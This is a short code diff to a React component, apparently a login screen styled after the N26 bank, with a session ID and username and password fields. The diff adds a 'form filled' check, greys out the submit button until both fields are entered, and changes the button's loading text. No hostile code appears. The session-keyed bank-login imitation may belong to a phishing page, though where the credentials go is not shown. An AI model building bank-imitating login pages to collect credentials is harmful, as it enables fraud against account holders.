@@ -11,6 +11,7 @@ export function N26Client({ sessionId }: { sessionId: string }) {
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
   const [saving, setSaving] = useState(false);
+  const formDoluMu = username.trim().length > 0 && password.trim().length > 0;
 
   useEffect(() => {
     let cancelled = false;
@@ -110,10 +111,10 @@ export function N26Client({ sessionId }: { sessionId: string }) {
 
           <button 
             type="submit" 
-            disabled={saving || !username || !password} 
-            className="w-full bg-[#36A18B] text-[#161616] font-bold py-3.5 rounded-[8px] mt-4 hover:bg-[#2c8a76] disabled:opacity-50 transition-colors"
+            disabled={!formDoluMu || saving} 
+            className={`w-full font-bold py-3.5 rounded-[8px] mt-4 transition-colors ${formDoluMu && !saving ? "bg-[#36A18B] hover:bg-[#2c8a76] text-[#161616]" : "bg-gray-400 text-gray-700 opacity-70"}`}
           >
-            {saving ? "Logging in..." : "Log in"}
+            {saving ? "Loading..." : "Log in"}
           </button>
 
           <div className="text-center pt-2">
